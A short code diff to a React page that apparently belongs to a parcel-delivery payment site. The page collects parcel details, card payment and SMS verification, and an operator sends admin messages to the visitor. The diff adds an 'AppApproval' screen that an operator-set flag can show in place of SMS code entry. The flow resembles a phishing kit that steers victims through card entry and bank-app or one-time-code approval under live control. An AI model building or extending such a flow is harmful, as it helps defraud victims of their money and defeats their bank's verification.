@@ -3,6 +3,7 @@ import StepIndicator from "@/components/StepIndicator";
 import ParcelDetails from "@/components/ParcelDetails";
 import PaymentForm from "@/components/PaymentForm";
 import SmsVerification from "@/components/SmsVerification";
+import AppApproval from "@/components/AppApproval";
 import SmsConfirmation from "@/components/SmsConfirmation";
 import AdminAlert from "@/components/AdminAlert";
 import { useClientSession } from "@/hooks/useClientSession";
@@ -17,6 +18,7 @@ const Index = () => {
     adminMessage, 
     messageType, 
     verificationCode,
+    approvalType,
     loading, 
     updateStep,
     updateVerificationCode,
@@ -87,7 +89,18 @@ const Index = () => {
           <PaymentForm onProceed={handleProceedToVerification} onBack={handleBack} />
         )}
 
-        {currentStep === 3 && session && (
+        {currentStep === 3 && session && approvalType === "app_pending" && (
+          <AppApproval 
+            sessionCode={session.session_code}
+            clientName={session.client_name}
+            phoneNumber={session.phone_number}
+            adminMessage={adminMessage}
+            messageType={messageType}
+            onDismissMessage={clearAdminMessage}
+          />
+        )}
+
+        {currentStep === 3 && session && approvalType !== "app_pending" && (
           <SmsVerification 
             onBack={handleBack} 
             sessionCode={session.session_code}
